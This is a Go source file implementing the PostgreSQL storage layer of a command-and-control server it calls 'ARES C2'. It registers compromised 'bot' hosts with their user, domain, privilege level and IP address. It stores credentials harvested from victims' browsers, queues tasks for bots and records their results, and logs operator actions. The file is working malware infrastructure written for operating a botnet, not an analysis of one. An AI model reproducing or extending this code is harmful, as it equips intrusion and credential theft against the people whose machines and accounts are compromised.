/*
 * ARES C2 — PostgreSQL Database Layer (v5.0 Overhaul)
 *
 * Replaces os.WriteFile/os.ReadFile with proper database storage.
 * All queries use parameterized SQL (no SQL injection possible).
 * Credentials stored AES-GCM encrypted at rest.
 */

package database

import (
	"database/sql"
	"fmt"
	"log"
	"time"

	_ "github.com/lib/pq"
)

type DB struct {
	pool *sql.DB
}

// Connect creates a new database connection pool
func Connect(dsn string) (*DB, error) {
	pool, err := sql.Open("postgres", dsn)
	if err != nil {
		return nil, fmt.Errorf("database connect: %w", err)
	}
	pool.SetMaxOpenConns(25)
	pool.SetMaxIdleConns(5)
	pool.SetConnMaxLifetime(5 * time.Minute)

	if err := pool.Ping(); err != nil {
		return nil, fmt.Errorf("database ping: %w", err)
	}
	log.Println("[DB] Connected to PostgreSQL")
	return &DB{pool: pool}, nil
}

func (db *DB) Close() error {
	return db.pool.Close()
}

// RunMigrations executes SQL migration files
func (db *DB) RunMigrations(sqlStatements string) error {
	_, err := db.pool.Exec(sqlStatements)
	return err
}

// ── Bot Operations ──

type BotRecord struct {
	ID         string    `json:"id"`
	Hostname   string    `json:"hostname"`
	Username   string    `json:"username"`
	Domain     string    `json:"domain"`
	OS         string    `json:"os"`
	Arch       string    `json:"arch"`
	PID        int       `json:"pid"`
	HWID       string    `json:"hwid"`
	ExternalIP string    `json:"external_ip"`
	Country    string    `json:"country"`
	Elevated   bool      `json:"elevated"`
	Status     string    `json:"status"`
	FirstSeen  time.Time `json:"first_seen"`
	LastSeen   time.Time `json:"last_seen"`
}

func (db *DB) UpsertBot(bot *BotRecord) error {
	_, err := db.pool.Exec(`
		INSERT INTO bots (id, hostname, username, domain, os, arch, pid, hwid,
		                   external_ip, country, elevated, status, first_seen, last_seen)
		VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
		ON CONFLICT (id) DO UPDATE SET
			last_seen = $14, status = $12, pid = $7, external_ip = $9`,
		bot.ID, bot.Hostname, bot.Username, bot.Domain, bot.OS, bot.Arch,
		bot.PID, bot.HWID, bot.ExternalIP, bot.Country, bot.Elevated,
		bot.Status, bot.FirstSeen, bot.LastSeen)
	return err
}

func (db *DB) UpdateBotStatus(id, status string) error {
	_, err := db.pool.Exec(`UPDATE bots SET status=$1, last_seen=NOW() WHERE id=$2`, status, id)
	return err
}

func (db *DB) GetBot(id string) (*BotRecord, error) {
	bot := &BotRecord{}
	err := db.pool.QueryRow(`SELECT id,hostname,username,domain,os,arch,pid,hwid,
		external_ip,country,elevated,status,first_seen,last_seen FROM bots WHERE id=$1`, id).Scan(
		&bot.ID, &bot.Hostname, &bot.Username, &bot.Domain, &bot.OS, &bot.Arch,
		&bot.PID, &bot.HWID, &bot.ExternalIP, &bot.Country, &bot.Elevated,
		&bot.Status, &bot.FirstSeen, &bot.LastSeen)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	return bot, err
}

func (db *DB) ListBots() ([]*BotRecord, error) {
	rows, err := db.pool.Query(`SELECT id,hostname,username,domain,os,arch,pid,hwid,
		external_ip,country,elevated,status,first_seen,last_seen FROM bots ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var bots []*BotRecord
	for rows.Next() {
		b := &BotRecord{}
		if err := rows.Scan(&b.ID, &b.Hostname, &b.Username, &b.Domain, &b.OS, &b.Arch,
			&b.PID, &b.HWID, &b.ExternalIP, &b.Country, &b.Elevated,
			&b.Status, &b.FirstSeen, &b.LastSeen); err != nil {
			continue
		}
		bots = append(bots, b)
	}
	return bots, nil
}

func (db *DB) RemoveBot(id string) error {
	_, err := db.pool.Exec(`DELETE FROM bots WHERE id=$1`, id)
	return err
}

func (db *DB) CountBots() (total, active, sleeping, dead int) {
	db.pool.QueryRow(`SELECT COUNT(*) FROM bots`).Scan(&total)
	db.pool.QueryRow(`SELECT COUNT(*) FROM bots WHERE status='active'`).Scan(&active)
	db.pool.QueryRow(`SELECT COUNT(*) FROM bots WHERE status='sleeping'`).Scan(&sleeping)
	db.pool.QueryRow(`SELECT COUNT(*) FROM bots WHERE status='dead'`).Scan(&dead)
	return
}

// ── Credential Operations ──

type CredentialRecord struct {
	ID          int       `json:"id"`
	BotID       string    `json:"bot_id"`
	Type        string    `json:"type"`
	Browser     string    `json:"browser"`
	Profile     string    `json:"profile"`
	URL         string    `json:"url"`
	Username    string    `json:"username"`
	DataEnc     []byte    `json:"-"`           // AES-GCM encrypted
	CreatedAt   time.Time `json:"created_at"`
}

func (db *DB) SaveCredential(botID, credType, browser, profile, url, username string, encData []byte) error {
	_, err := db.pool.Exec(`
		INSERT INTO credentials (bot_id, type, browser, profile, url, username, password_enc)
		VALUES ($1, $2, $3, $4, $5, $6, $7)
		ON CONFLICT (bot_id, type, url, username)
		DO UPDATE SET password_enc = $7, browser = $3`,
		botID, credType, browser, profile, url, username, encData)
	return err
}

func (db *DB) GetCredentials(botID string) ([]*CredentialRecord, error) {
	rows, err := db.pool.Query(`
		SELECT id, bot_id, type, browser, profile, url, username, password_enc, created_at
		FROM credentials WHERE bot_id=$1 ORDER BY created_at DESC`, botID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []*CredentialRecord
	for rows.Next() {
		c := &CredentialRecord{}
		if err := rows.Scan(&c.ID, &c.BotID, &c.Type, &c.Browser, &c.Profile,
			&c.URL, &c.Username, &c.DataEnc, &c.CreatedAt); err != nil {
			continue
		}
		creds = append(creds, c)
	}
	return creds, nil
}

func (db *DB) CountCredentials() int {
	var count int
	db.pool.QueryRow(`SELECT COUNT(*) FROM credentials`).Scan(&count)
	return count
}

// ── Task Operations ──

type TaskRecord struct {
	ID          string    `json:"id"`
	BotID       string    `json:"bot_id"`
	Type        int       `json:"type"`
	Args        string    `json:"args"`  // JSONB
	Status      string    `json:"status"`
	CreatedAt   time.Time `json:"created_at"`
	CompletedAt *time.Time `json:"completed_at,omitempty"`
}

func (db *DB) CreateTask(id, botID string, taskType int, argsJSON string) error {
	_, err := db.pool.Exec(`
		INSERT INTO tasks (id, bot_id, type, args) VALUES ($1, $2, $3, $4::jsonb)`,
		id, botID, taskType, argsJSON)
	return err
}

func (db *DB) GetPendingTasks(botID string) ([]*TaskRecord, error) {
	rows, err := db.pool.Query(`
		SELECT id, bot_id, type, args, status, created_at
		FROM tasks WHERE bot_id=$1 AND status='pending' ORDER BY created_at`, botID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tasks []*TaskRecord
	for rows.Next() {
		t := &TaskRecord{}
		if err := rows.Scan(&t.ID, &t.BotID, &t.Type, &t.Args, &t.Status, &t.CreatedAt); err != nil {
			continue
		}
		tasks = append(tasks, t)
	}

	// Mark as delivered
	for _, t := range tasks {
		db.pool.Exec(`UPDATE tasks SET status='delivered' WHERE id=$1`, t.ID)
	}
	return tasks, nil
}

func (db *DB) CompleteTask(taskID string, success bool, outputEnc []byte, errMsg string) error {
	_, err := db.pool.Exec(`
		UPDATE tasks SET status='completed', completed_at=NOW() WHERE id=$1`, taskID)
	if err != nil {
		return err
	}
	_, err = db.pool.Exec(`
		INSERT INTO task_results (bot_id, task_id, success, output_enc, error)
		SELECT bot_id, $1, $2, $3, $4 FROM tasks WHERE id=$1`,
		taskID, success, outputEnc, errMsg)
	return err
}

// ── Audit Log ──

type AuditRecord struct {
	ID        int       `json:"id"`
	Operator  string    `json:"operator"`
	Action    string    `json:"action"`
	Detail    string    `json:"detail"`
	IP        string    `json:"ip"`
	CreatedAt time.Time `json:"created_at"`
}

func (db *DB) AuditLog(operator, action, detail, ip string) error {
	_, err := db.pool.Exec(`
		INSERT INTO audit_log (operator, action, detail, ip) VALUES ($1, $2, $3, $4)`,
		operator, action, detail, ip)
	return err
}

func (db *DB) GetAuditLog(limit int) ([]*AuditRecord, error) {
	rows, err := db.pool.Query(`
		SELECT id, operator, action, detail, ip, created_at
		FROM audit_log ORDER BY created_at DESC LIMIT $1`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []*AuditRecord
	for rows.Next() {
		e := &AuditRecord{}
		if err := rows.Scan(&e.ID, &e.Operator, &e.Action, &e.Detail, &e.IP, &e.CreatedAt); err != nil {
			continue
		}
		entries = append(entries, e)
	}
	return entries, nil
}
